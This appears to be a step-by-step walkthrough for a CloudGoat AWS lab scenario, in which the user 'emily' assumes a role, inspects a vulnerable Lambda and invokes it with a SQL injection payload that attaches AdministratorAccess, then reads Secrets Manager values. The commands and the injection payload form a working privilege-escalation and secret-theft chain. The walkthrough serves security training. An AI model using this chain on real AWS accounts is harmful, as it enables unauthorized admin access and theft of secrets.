1. Get permissions for the 'emily' user.
```bash
# This command will give you the ARN & full name of you user.
aws --profile emily --region eu-central-1 sts get-caller-identity
# This command will list the policies attached to your user.
aws --profile emily --region eu-central-1 iam list-user-policies --user-name emily
# This command will list all of your permissions.
aws --profile emily --region eu-central-1 iam get-user-policy --user-name emily --policy-name Emily-standard-user-assumer
```

2. List all roles, assume a role for privesc.
```bash
# This command will list all the roles in your account, one of which should be assumable. 
aws --profile emily --region eu-central-1 iam list-roles
# This command will list all policies for the target role
aws --profile emily --region eu-central-1 iam list-role-policies --role-name [target-role]
# This command will get you credentials for the cloudgoat role that can invoke lambdas.
aws --profile emily --region eu-central-1 sts assume-role --role-arn [lambda-invoker_arn] --role-session-name lambdaInvoker
```

3. List lambdas to identify the target (vulnerable) lambda.
```bash
# This command will show you all lambda functions. The function can apply a predefined set of 
# aws managed policies to users (in reality it can only modify the emily user).
aws --profile assumed_role --region eu-central-1 lambda list-functions
# download function
```

4. Look at the lambda source code. You should see the database structure in a comment, as well as the code that is handling input parameters. It's vulnerable to an injection, and we'll see what an exploit looks like in the next step.
```bash
# This command will return a bunch of information about the lambda that can apply policies to emily.
# part of this information is a link to a url that will download the deployment package, which
# contains the source code for the function. Read over that source code to discover a vulnerability. 
aws --profile assumed_role --region eu-central-1 lambda get-function --function-name [policy_applier_lambda_name]
```

5. Invoke the role applier lambda function, passing the name of the emily user and the injection payload. 
```bash
# The following command will send a SQL injection payload to the lambda function
aws --profile assumed_role --region eu-central-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": "emily"}' out.txt
# cat the results to confirm everything is working properly
cat out.txt
```
6. Now that emily is an admin, use credentials for that user to list secrets from secretsmanager. 
```bash
# This command will list all the secrets in secretsmanager
aws --profile emily --region eu-central-1 secretsmanager list-secrets
# This command will get the value for a specific secret
aws --profile emily --region eu-central-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
```
